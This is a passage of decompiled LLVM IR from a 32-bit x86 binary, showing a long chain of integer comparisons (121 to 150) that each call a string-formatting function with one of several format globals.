  %v1_804b14f = zext i8 %v0_804b14f to i32
  store i32 %v1_804b14f, i32* @edx, align 4
  %v0_804b15b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b15b = zext i8 %v0_804b15b to i32
  %v2_804b16a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b16a, i32* @ebx, align 4
  %v5_804b171 = call i32 @szprintf(i32 %v2_804b16a, i32 ptrtoint ([14 x i8]* @global_var_8058d66.147 to i32), i32 %v1_804b15b, i32 %v1_804b14f)
  br label %dec_label_pc_804b179

dec_label_pc_804b179:                             ; preds = %dec_label_pc_804b149, %dec_label_pc_804b14f
  %v12_804b179 = icmp eq i32 %v11_8049ac4, 121
  %v1_804b17d = icmp eq i1 %v12_804b179, false
  br i1 %v1_804b17d, label %dec_label_pc_804b1a9, label %dec_label_pc_804b17f

dec_label_pc_804b17f:                             ; preds = %dec_label_pc_804b179
  %v0_804b17f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b17f = zext i8 %v0_804b17f to i32
  store i32 %v1_804b17f, i32* @edx, align 4
  %v0_804b18b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b18b = zext i8 %v0_804b18b to i32
  %v2_804b19a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b19a, i32* @ebx, align 4
  %v5_804b1a1 = call i32 @szprintf(i32 %v2_804b19a, i32 ptrtoint ([14 x i8]* @global_var_8058cc2.135 to i32), i32 %v1_804b18b, i32 %v1_804b17f)
  br label %dec_label_pc_804b1a9

dec_label_pc_804b1a9:                             ; preds = %dec_label_pc_804b179, %dec_label_pc_804b17f
  %v12_804b1a9 = icmp eq i32 %v11_8049ac4, 122
  %v1_804b1ad = icmp eq i1 %v12_804b1a9, false
  br i1 %v1_804b1ad, label %dec_label_pc_804b1d9, label %dec_label_pc_804b1af

dec_label_pc_804b1af:                             ; preds = %dec_label_pc_804b1a9
  %v0_804b1af = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b1af = zext i8 %v0_804b1af to i32
  store i32 %v1_804b1af, i32* @edx, align 4
  %v0_804b1bb = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b1bb = zext i8 %v0_804b1bb to i32
  %v2_804b1ca = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b1ca, i32* @ebx, align 4
  %v5_804b1d1 = call i32 @szprintf(i32 %v2_804b1ca, i32 ptrtoint ([13 x i8]* @global_var_8058d74.148 to i32), i32 %v1_804b1bb, i32 %v1_804b1af)
  br label %dec_label_pc_804b1d9

dec_label_pc_804b1d9:                             ; preds = %dec_label_pc_804b1a9, %dec_label_pc_804b1af
  %v12_804b1d9 = icmp eq i32 %v11_8049ac4, 123
  %v1_804b1dd = icmp eq i1 %v12_804b1d9, false
  br i1 %v1_804b1dd, label %dec_label_pc_804b209, label %dec_label_pc_804b1df

dec_label_pc_804b1df:                             ; preds = %dec_label_pc_804b1d9
  %v0_804b1df = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b1df = zext i8 %v0_804b1df to i32
  store i32 %v1_804b1df, i32* @edx, align 4
  %v0_804b1eb = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b1eb = zext i8 %v0_804b1eb to i32
  %v2_804b1fa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b1fa, i32* @ebx, align 4
  %v5_804b201 = call i32 @szprintf(i32 %v2_804b1fa, i32 ptrtoint ([12 x i8]* @global_var_8058d81.149 to i32), i32 %v1_804b1eb, i32 %v1_804b1df)
  br label %dec_label_pc_804b209

dec_label_pc_804b209:                             ; preds = %dec_label_pc_804b1d9, %dec_label_pc_804b1df
  %v12_804b209 = icmp eq i32 %v11_8049ac4, 124
  %v1_804b20d = icmp eq i1 %v12_804b209, false
  br i1 %v1_804b20d, label %dec_label_pc_804b239, label %dec_label_pc_804b20f

dec_label_pc_804b20f:                             ; preds = %dec_label_pc_804b209
  %v0_804b20f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b20f = zext i8 %v0_804b20f to i32
  store i32 %v1_804b20f, i32* @edx, align 4
  %v0_804b21b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b21b = zext i8 %v0_804b21b to i32
  %v2_804b22a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b22a, i32* @ebx, align 4
  %v5_804b231 = call i32 @szprintf(i32 %v2_804b22a, i32 ptrtoint ([14 x i8]* @global_var_8058d8d.150 to i32), i32 %v1_804b21b, i32 %v1_804b20f)
  br label %dec_label_pc_804b239

dec_label_pc_804b239:                             ; preds = %dec_label_pc_804b209, %dec_label_pc_804b20f
  %v12_804b239 = icmp eq i32 %v11_8049ac4, 125
  %v1_804b23d = icmp eq i1 %v12_804b239, false
  br i1 %v1_804b23d, label %dec_label_pc_804b269, label %dec_label_pc_804b23f

dec_label_pc_804b23f:                             ; preds = %dec_label_pc_804b239
  %v0_804b23f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b23f = zext i8 %v0_804b23f to i32
  store i32 %v1_804b23f, i32* @edx, align 4
  %v0_804b24b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b24b = zext i8 %v0_804b24b to i32
  %v2_804b25a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b25a, i32* @ebx, align 4
  %v5_804b261 = call i32 @szprintf(i32 %v2_804b25a, i32 ptrtoint ([14 x i8]* @global_var_8058d9b.151 to i32), i32 %v1_804b24b, i32 %v1_804b23f)
  br label %dec_label_pc_804b269

dec_label_pc_804b269:                             ; preds = %dec_label_pc_804b239, %dec_label_pc_804b23f
  %v12_804b269 = icmp eq i32 %v11_8049ac4, 126
  %v1_804b26d = icmp eq i1 %v12_804b269, false
  br i1 %v1_804b26d, label %dec_label_pc_804b299, label %dec_label_pc_804b26f

dec_label_pc_804b26f:                             ; preds = %dec_label_pc_804b269
  %v0_804b26f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b26f = zext i8 %v0_804b26f to i32
  store i32 %v1_804b26f, i32* @edx, align 4
  %v0_804b27b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b27b = zext i8 %v0_804b27b to i32
  %v2_804b28a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b28a, i32* @ebx, align 4
  %v5_804b291 = call i32 @szprintf(i32 %v2_804b28a, i32 ptrtoint ([14 x i8]* @global_var_8058d8d.150 to i32), i32 %v1_804b27b, i32 %v1_804b26f)
  br label %dec_label_pc_804b299

dec_label_pc_804b299:                             ; preds = %dec_label_pc_804b269, %dec_label_pc_804b26f
  %v12_804b299 = icmp eq i32 %v11_8049ac4, 127
  %v1_804b29d = icmp eq i1 %v12_804b299, false
  br i1 %v1_804b29d, label %dec_label_pc_804b2c9, label %dec_label_pc_804b29f

dec_label_pc_804b29f:                             ; preds = %dec_label_pc_804b299
  %v0_804b29f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b29f = zext i8 %v0_804b29f to i32
  store i32 %v1_804b29f, i32* @edx, align 4
  %v0_804b2ab = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b2ab = zext i8 %v0_804b2ab to i32
  %v2_804b2ba = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b2ba, i32* @ebx, align 4
  %v5_804b2c1 = call i32 @szprintf(i32 %v2_804b2ba, i32 ptrtoint ([14 x i8]* @global_var_8058da9.152 to i32), i32 %v1_804b2ab, i32 %v1_804b29f)
  br label %dec_label_pc_804b2c9

dec_label_pc_804b2c9:                             ; preds = %dec_label_pc_804b299, %dec_label_pc_804b29f
  %v9_804b2c9 = icmp eq i32 %v11_8049ac4, 128
  %v1_804b2d0 = icmp eq i1 %v9_804b2c9, false
  br i1 %v1_804b2d0, label %dec_label_pc_804b2fc, label %dec_label_pc_804b2d2

dec_label_pc_804b2d2:                             ; preds = %dec_label_pc_804b2c9
  %v0_804b2d2 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b2d2 = zext i8 %v0_804b2d2 to i32
  store i32 %v1_804b2d2, i32* @edx, align 4
  %v0_804b2de = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b2de = zext i8 %v0_804b2de to i32
  %v2_804b2ed = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b2ed, i32* @ebx, align 4
  %v5_804b2f4 = call i32 @szprintf(i32 %v2_804b2ed, i32 ptrtoint ([14 x i8]* @global_var_8058db7.153 to i32), i32 %v1_804b2de, i32 %v1_804b2d2)
  br label %dec_label_pc_804b2fc

dec_label_pc_804b2fc:                             ; preds = %dec_label_pc_804b2c9, %dec_label_pc_804b2d2
  %v12_804b2fc = icmp eq i32 %v11_8049ac4, 129
  %v1_804b303 = icmp eq i1 %v12_804b2fc, false
  br i1 %v1_804b303, label %dec_label_pc_804b32f, label %dec_label_pc_804b305

dec_label_pc_804b305:                             ; preds = %dec_label_pc_804b2fc
  %v0_804b305 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b305 = zext i8 %v0_804b305 to i32
  store i32 %v1_804b305, i32* @edx, align 4
  %v0_804b311 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b311 = zext i8 %v0_804b311 to i32
  %v2_804b320 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b320, i32* @ebx, align 4
  %v5_804b327 = call i32 @szprintf(i32 %v2_804b320, i32 ptrtoint ([14 x i8]* @global_var_8058dc5.154 to i32), i32 %v1_804b311, i32 %v1_804b305)
  br label %dec_label_pc_804b32f

dec_label_pc_804b32f:                             ; preds = %dec_label_pc_804b2fc, %dec_label_pc_804b305
  %v12_804b32f = icmp eq i32 %v11_8049ac4, 130
  %v1_804b336 = icmp eq i1 %v12_804b32f, false
  br i1 %v1_804b336, label %dec_label_pc_804b362, label %dec_label_pc_804b338

dec_label_pc_804b338:                             ; preds = %dec_label_pc_804b32f
  %v0_804b338 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b338 = zext i8 %v0_804b338 to i32
  store i32 %v1_804b338, i32* @edx, align 4
  %v0_804b344 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b344 = zext i8 %v0_804b344 to i32
  %v2_804b353 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b353, i32* @ebx, align 4
  %v5_804b35a = call i32 @szprintf(i32 %v2_804b353, i32 ptrtoint ([14 x i8]* @global_var_8058dd3.155 to i32), i32 %v1_804b344, i32 %v1_804b338)
  br label %dec_label_pc_804b362

dec_label_pc_804b362:                             ; preds = %dec_label_pc_804b32f, %dec_label_pc_804b338
  %v12_804b362 = icmp eq i32 %v11_8049ac4, 131
  %v1_804b369 = icmp eq i1 %v12_804b362, false
  br i1 %v1_804b369, label %dec_label_pc_804b395, label %dec_label_pc_804b36b

dec_label_pc_804b36b:                             ; preds = %dec_label_pc_804b362
  %v0_804b36b = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b36b = zext i8 %v0_804b36b to i32
  store i32 %v1_804b36b, i32* @edx, align 4
  %v0_804b377 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b377 = zext i8 %v0_804b377 to i32
  %v2_804b386 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b386, i32* @ebx, align 4
  %v5_804b38d = call i32 @szprintf(i32 %v2_804b386, i32 ptrtoint ([14 x i8]* @global_var_8058de1.156 to i32), i32 %v1_804b377, i32 %v1_804b36b)
  br label %dec_label_pc_804b395

dec_label_pc_804b395:                             ; preds = %dec_label_pc_804b362, %dec_label_pc_804b36b
  %v12_804b395 = icmp eq i32 %v11_8049ac4, 132
  %v1_804b39c = icmp eq i1 %v12_804b395, false
  br i1 %v1_804b39c, label %dec_label_pc_804b3c8, label %dec_label_pc_804b39e

dec_label_pc_804b39e:                             ; preds = %dec_label_pc_804b395
  %v0_804b39e = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b39e = zext i8 %v0_804b39e to i32
  store i32 %v1_804b39e, i32* @edx, align 4
  %v0_804b3aa = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b3aa = zext i8 %v0_804b3aa to i32
  %v2_804b3b9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b3b9, i32* @ebx, align 4
  %v5_804b3c0 = call i32 @szprintf(i32 %v2_804b3b9, i32 ptrtoint ([14 x i8]* @global_var_8058def.157 to i32), i32 %v1_804b3aa, i32 %v1_804b39e)
  br label %dec_label_pc_804b3c8

dec_label_pc_804b3c8:                             ; preds = %dec_label_pc_804b395, %dec_label_pc_804b39e
  %v12_804b3c8 = icmp eq i32 %v11_8049ac4, 133
  %v1_804b3cf = icmp eq i1 %v12_804b3c8, false
  br i1 %v1_804b3cf, label %dec_label_pc_804b3fb, label %dec_label_pc_804b3d1

dec_label_pc_804b3d1:                             ; preds = %dec_label_pc_804b3c8
  %v0_804b3d1 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b3d1 = zext i8 %v0_804b3d1 to i32
  store i32 %v1_804b3d1, i32* @edx, align 4
  %v0_804b3dd = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b3dd = zext i8 %v0_804b3dd to i32
  %v2_804b3ec = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b3ec, i32* @ebx, align 4
  %v5_804b3f3 = call i32 @szprintf(i32 %v2_804b3ec, i32 ptrtoint ([14 x i8]* @global_var_8058dfd.158 to i32), i32 %v1_804b3dd, i32 %v1_804b3d1)
  br label %dec_label_pc_804b3fb

dec_label_pc_804b3fb:                             ; preds = %dec_label_pc_804b3c8, %dec_label_pc_804b3d1
  %v12_804b3fb = icmp eq i32 %v11_8049ac4, 134
  %v1_804b402 = icmp eq i1 %v12_804b3fb, false
  br i1 %v1_804b402, label %dec_label_pc_804b42e, label %dec_label_pc_804b404

dec_label_pc_804b404:                             ; preds = %dec_label_pc_804b3fb
  %v0_804b404 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b404 = zext i8 %v0_804b404 to i32
  store i32 %v1_804b404, i32* @edx, align 4
  %v0_804b410 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b410 = zext i8 %v0_804b410 to i32
  %v2_804b41f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b41f, i32* @ebx, align 4
  %v5_804b426 = call i32 @szprintf(i32 %v2_804b41f, i32 ptrtoint ([14 x i8]* @global_var_8058e0b.159 to i32), i32 %v1_804b410, i32 %v1_804b404)
  br label %dec_label_pc_804b42e

dec_label_pc_804b42e:                             ; preds = %dec_label_pc_804b3fb, %dec_label_pc_804b404
  %v12_804b42e = icmp eq i32 %v11_8049ac4, 135
  %v1_804b435 = icmp eq i1 %v12_804b42e, false
  br i1 %v1_804b435, label %dec_label_pc_804b461, label %dec_label_pc_804b437

dec_label_pc_804b437:                             ; preds = %dec_label_pc_804b42e
  %v0_804b437 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b437 = zext i8 %v0_804b437 to i32
  store i32 %v1_804b437, i32* @edx, align 4
  %v0_804b443 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b443 = zext i8 %v0_804b443 to i32
  %v2_804b452 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b452, i32* @ebx, align 4
  %v5_804b459 = call i32 @szprintf(i32 %v2_804b452, i32 ptrtoint ([14 x i8]* @global_var_8058e19.160 to i32), i32 %v1_804b443, i32 %v1_804b437)
  br label %dec_label_pc_804b461

dec_label_pc_804b461:                             ; preds = %dec_label_pc_804b42e, %dec_label_pc_804b437
  %v12_804b461 = icmp eq i32 %v11_8049ac4, 136
  %v1_804b468 = icmp eq i1 %v12_804b461, false
  br i1 %v1_804b468, label %dec_label_pc_804b494, label %dec_label_pc_804b46a

dec_label_pc_804b46a:                             ; preds = %dec_label_pc_804b461
  %v0_804b46a = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b46a = zext i8 %v0_804b46a to i32
  store i32 %v1_804b46a, i32* @edx, align 4
  %v0_804b476 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b476 = zext i8 %v0_804b476 to i32
  %v2_804b485 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b485, i32* @ebx, align 4
  %v5_804b48c = call i32 @szprintf(i32 %v2_804b485, i32 ptrtoint ([14 x i8]* @global_var_8058e27.161 to i32), i32 %v1_804b476, i32 %v1_804b46a)
  br label %dec_label_pc_804b494

dec_label_pc_804b494:                             ; preds = %dec_label_pc_804b461, %dec_label_pc_804b46a
  %v12_804b494 = icmp eq i32 %v11_8049ac4, 137
  %v1_804b49b = icmp eq i1 %v12_804b494, false
  br i1 %v1_804b49b, label %dec_label_pc_804b4c7, label %dec_label_pc_804b49d

dec_label_pc_804b49d:                             ; preds = %dec_label_pc_804b494
  %v0_804b49d = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b49d = zext i8 %v0_804b49d to i32
  store i32 %v1_804b49d, i32* @edx, align 4
  %v0_804b4a9 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b4a9 = zext i8 %v0_804b4a9 to i32
  %v2_804b4b8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b4b8, i32* @ebx, align 4
  %v5_804b4bf = call i32 @szprintf(i32 %v2_804b4b8, i32 ptrtoint ([13 x i8]* @global_var_8058e35.162 to i32), i32 %v1_804b4a9, i32 %v1_804b49d)
  br label %dec_label_pc_804b4c7

dec_label_pc_804b4c7:                             ; preds = %dec_label_pc_804b494, %dec_label_pc_804b49d
  %v12_804b4c7 = icmp eq i32 %v11_8049ac4, 138
  %v1_804b4ce = icmp eq i1 %v12_804b4c7, false
  br i1 %v1_804b4ce, label %dec_label_pc_804b4fa, label %dec_label_pc_804b4d0

dec_label_pc_804b4d0:                             ; preds = %dec_label_pc_804b4c7
  %v0_804b4d0 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b4d0 = zext i8 %v0_804b4d0 to i32
  store i32 %v1_804b4d0, i32* @edx, align 4
  %v0_804b4dc = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b4dc = zext i8 %v0_804b4dc to i32
  %v2_804b4eb = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b4eb, i32* @ebx, align 4
  %v5_804b4f2 = call i32 @szprintf(i32 %v2_804b4eb, i32 ptrtoint ([13 x i8]* @global_var_8058e42.163 to i32), i32 %v1_804b4dc, i32 %v1_804b4d0)
  br label %dec_label_pc_804b4fa

dec_label_pc_804b4fa:                             ; preds = %dec_label_pc_804b4c7, %dec_label_pc_804b4d0
  %v12_804b4fa = icmp eq i32 %v11_8049ac4, 139
  %v1_804b501 = icmp eq i1 %v12_804b4fa, false
  br i1 %v1_804b501, label %dec_label_pc_804b52d, label %dec_label_pc_804b503

dec_label_pc_804b503:                             ; preds = %dec_label_pc_804b4fa
  %v0_804b503 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b503 = zext i8 %v0_804b503 to i32
  store i32 %v1_804b503, i32* @edx, align 4
  %v0_804b50f = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b50f = zext i8 %v0_804b50f to i32
  %v2_804b51e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b51e, i32* @ebx, align 4
  %v5_804b525 = call i32 @szprintf(i32 %v2_804b51e, i32 ptrtoint ([13 x i8]* @global_var_8058e4f.164 to i32), i32 %v1_804b50f, i32 %v1_804b503)
  br label %dec_label_pc_804b52d

dec_label_pc_804b52d:                             ; preds = %dec_label_pc_804b4fa, %dec_label_pc_804b503
  %v12_804b52d = icmp eq i32 %v11_8049ac4, 140
  %v1_804b534 = icmp eq i1 %v12_804b52d, false
  br i1 %v1_804b534, label %dec_label_pc_804b560, label %dec_label_pc_804b536

dec_label_pc_804b536:                             ; preds = %dec_label_pc_804b52d
  %v0_804b536 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b536 = zext i8 %v0_804b536 to i32
  store i32 %v1_804b536, i32* @edx, align 4
  %v0_804b542 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b542 = zext i8 %v0_804b542 to i32
  %v2_804b551 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b551, i32* @ebx, align 4
  %v5_804b558 = call i32 @szprintf(i32 %v2_804b551, i32 ptrtoint ([13 x i8]* @global_var_8058e5c.165 to i32), i32 %v1_804b542, i32 %v1_804b536)
  br label %dec_label_pc_804b560

dec_label_pc_804b560:                             ; preds = %dec_label_pc_804b52d, %dec_label_pc_804b536
  %v12_804b560 = icmp eq i32 %v11_8049ac4, 141
  %v1_804b567 = icmp eq i1 %v12_804b560, false
  br i1 %v1_804b567, label %dec_label_pc_804b593, label %dec_label_pc_804b569

dec_label_pc_804b569:                             ; preds = %dec_label_pc_804b560
  %v0_804b569 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b569 = zext i8 %v0_804b569 to i32
  store i32 %v1_804b569, i32* @edx, align 4
  %v0_804b575 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b575 = zext i8 %v0_804b575 to i32
  %v2_804b584 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b584, i32* @ebx, align 4
  %v5_804b58b = call i32 @szprintf(i32 %v2_804b584, i32 ptrtoint ([13 x i8]* @global_var_8058e69.166 to i32), i32 %v1_804b575, i32 %v1_804b569)
  br label %dec_label_pc_804b593

dec_label_pc_804b593:                             ; preds = %dec_label_pc_804b560, %dec_label_pc_804b569
  %v12_804b593 = icmp eq i32 %v11_8049ac4, 142
  %v1_804b59a = icmp eq i1 %v12_804b593, false
  br i1 %v1_804b59a, label %dec_label_pc_804b5c6, label %dec_label_pc_804b59c

dec_label_pc_804b59c:                             ; preds = %dec_label_pc_804b593
  %v0_804b59c = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b59c = zext i8 %v0_804b59c to i32
  store i32 %v1_804b59c, i32* @edx, align 4
  %v0_804b5a8 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b5a8 = zext i8 %v0_804b5a8 to i32
  %v2_804b5b7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b5b7, i32* @ebx, align 4
  %v5_804b5be = call i32 @szprintf(i32 %v2_804b5b7, i32 ptrtoint ([13 x i8]* @global_var_8058e76.167 to i32), i32 %v1_804b5a8, i32 %v1_804b59c)
  br label %dec_label_pc_804b5c6

dec_label_pc_804b5c6:                             ; preds = %dec_label_pc_804b593, %dec_label_pc_804b59c
  %v12_804b5c6 = icmp eq i32 %v11_8049ac4, 143
  %v1_804b5cd = icmp eq i1 %v12_804b5c6, false
  br i1 %v1_804b5cd, label %dec_label_pc_804b5f9, label %dec_label_pc_804b5cf

dec_label_pc_804b5cf:                             ; preds = %dec_label_pc_804b5c6
  %v0_804b5cf = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b5cf = zext i8 %v0_804b5cf to i32
  store i32 %v1_804b5cf, i32* @edx, align 4
  %v0_804b5db = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b5db = zext i8 %v0_804b5db to i32
  %v2_804b5ea = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b5ea, i32* @ebx, align 4
  %v5_804b5f1 = call i32 @szprintf(i32 %v2_804b5ea, i32 ptrtoint ([14 x i8]* @global_var_8058d8d.150 to i32), i32 %v1_804b5db, i32 %v1_804b5cf)
  br label %dec_label_pc_804b5f9

dec_label_pc_804b5f9:                             ; preds = %dec_label_pc_804b5c6, %dec_label_pc_804b5cf
  %v9_804b5f9 = icmp eq i32 %v11_8049ac4, 144
  %v1_804b600 = icmp eq i1 %v9_804b5f9, false
  br i1 %v1_804b600, label %dec_label_pc_804b62c, label %dec_label_pc_804b602

dec_label_pc_804b602:                             ; preds = %dec_label_pc_804b5f9
  %v0_804b602 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b602 = zext i8 %v0_804b602 to i32
  store i32 %v1_804b602, i32* @edx, align 4
  %v0_804b60e = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b60e = zext i8 %v0_804b60e to i32
  %v2_804b61d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b61d, i32* @ebx, align 4
  %v5_804b624 = call i32 @szprintf(i32 %v2_804b61d, i32 ptrtoint ([14 x i8]* @global_var_8058e83.168 to i32), i32 %v1_804b60e, i32 %v1_804b602)
  br label %dec_label_pc_804b62c

dec_label_pc_804b62c:                             ; preds = %dec_label_pc_804b5f9, %dec_label_pc_804b602
  %v12_804b62c = icmp eq i32 %v11_8049ac4, 145
  %v1_804b633 = icmp eq i1 %v12_804b62c, false
  br i1 %v1_804b633, label %dec_label_pc_804b65f, label %dec_label_pc_804b635

dec_label_pc_804b635:                             ; preds = %dec_label_pc_804b62c
  %v0_804b635 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b635 = zext i8 %v0_804b635 to i32
  store i32 %v1_804b635, i32* @edx, align 4
  %v0_804b641 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b641 = zext i8 %v0_804b641 to i32
  %v2_804b650 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b650, i32* @ebx, align 4
  %v5_804b657 = call i32 @szprintf(i32 %v2_804b650, i32 ptrtoint ([14 x i8]* @global_var_8058e91.169 to i32), i32 %v1_804b641, i32 %v1_804b635)
  br label %dec_label_pc_804b65f

dec_label_pc_804b65f:                             ; preds = %dec_label_pc_804b62c, %dec_label_pc_804b635
  %v12_804b65f = icmp eq i32 %v11_8049ac4, 146
  %v1_804b666 = icmp eq i1 %v12_804b65f, false
  br i1 %v1_804b666, label %dec_label_pc_804b692, label %dec_label_pc_804b668

dec_label_pc_804b668:                             ; preds = %dec_label_pc_804b65f
  %v0_804b668 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b668 = zext i8 %v0_804b668 to i32
  store i32 %v1_804b668, i32* @edx, align 4
  %v0_804b674 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b674 = zext i8 %v0_804b674 to i32
  %v2_804b683 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b683, i32* @ebx, align 4
  %v5_804b68a = call i32 @szprintf(i32 %v2_804b683, i32 ptrtoint ([14 x i8]* @global_var_8058e9f.170 to i32), i32 %v1_804b674, i32 %v1_804b668)
  br label %dec_label_pc_804b692

dec_label_pc_804b692:                             ; preds = %dec_label_pc_804b65f, %dec_label_pc_804b668
  %v12_804b692 = icmp eq i32 %v11_8049ac4, 147
  %v1_804b699 = icmp eq i1 %v12_804b692, false
  br i1 %v1_804b699, label %dec_label_pc_804b6c5, label %dec_label_pc_804b69b

dec_label_pc_804b69b:                             ; preds = %dec_label_pc_804b692
  %v0_804b69b = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b69b = zext i8 %v0_804b69b to i32
  store i32 %v1_804b69b, i32* @edx, align 4
  %v0_804b6a7 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b6a7 = zext i8 %v0_804b6a7 to i32
  %v2_804b6b6 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b6b6, i32* @ebx, align 4
  %v5_804b6bd = call i32 @szprintf(i32 %v2_804b6b6, i32 ptrtoint ([13 x i8]* @global_var_8058ead.171 to i32), i32 %v1_804b6a7, i32 %v1_804b69b)
  br label %dec_label_pc_804b6c5

dec_label_pc_804b6c5:                             ; preds = %dec_label_pc_804b692, %dec_label_pc_804b69b
  %v12_804b6c5 = icmp eq i32 %v11_8049ac4, 148
  %v1_804b6cc = icmp eq i1 %v12_804b6c5, false
  br i1 %v1_804b6cc, label %dec_label_pc_804b6f8, label %dec_label_pc_804b6ce

dec_label_pc_804b6ce:                             ; preds = %dec_label_pc_804b6c5
  %v0_804b6ce = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b6ce = zext i8 %v0_804b6ce to i32
  store i32 %v1_804b6ce, i32* @edx, align 4
  %v0_804b6da = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b6da = zext i8 %v0_804b6da to i32
  %v2_804b6e9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b6e9, i32* @ebx, align 4
  %v5_804b6f0 = call i32 @szprintf(i32 %v2_804b6e9, i32 ptrtoint ([13 x i8]* @global_var_8058eba.172 to i32), i32 %v1_804b6da, i32 %v1_804b6ce)
  br label %dec_label_pc_804b6f8

dec_label_pc_804b6f8:                             ; preds = %dec_label_pc_804b6c5, %dec_label_pc_804b6ce
  %v12_804b6f8 = icmp eq i32 %v11_8049ac4, 149
  %v1_804b6ff = icmp eq i1 %v12_804b6f8, false
  br i1 %v1_804b6ff, label %dec_label_pc_804b72b, label %dec_label_pc_804b701

dec_label_pc_804b701:                             ; preds = %dec_label_pc_804b6f8
  %v0_804b701 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b701 = zext i8 %v0_804b701 to i32
  store i32 %v1_804b701, i32* @edx, align 4
  %v0_804b70d = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b70d = zext i8 %v0_804b70d to i32
  %v2_804b71c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b71c, i32* @ebx, align 4
  %v5_804b723 = call i32 @szprintf(i32 %v2_804b71c, i32 ptrtoint ([14 x i8]* @global_var_8058ec7.173 to i32), i32 %v1_804b70d, i32 %v1_804b701)
  br label %dec_label_pc_804b72b

dec_label_pc_804b72b:                             ; preds = %dec_label_pc_804b6f8, %dec_label_pc_804b701
  %v12_804b72b = icmp eq i32 %v11_8049ac4, 150
  %v1_804b732 = icmp eq i1 %v12_804b72b, false
  br i1 %v1_804b732, label %dec_label_pc_804b75e, label %dec_label_pc_804b734

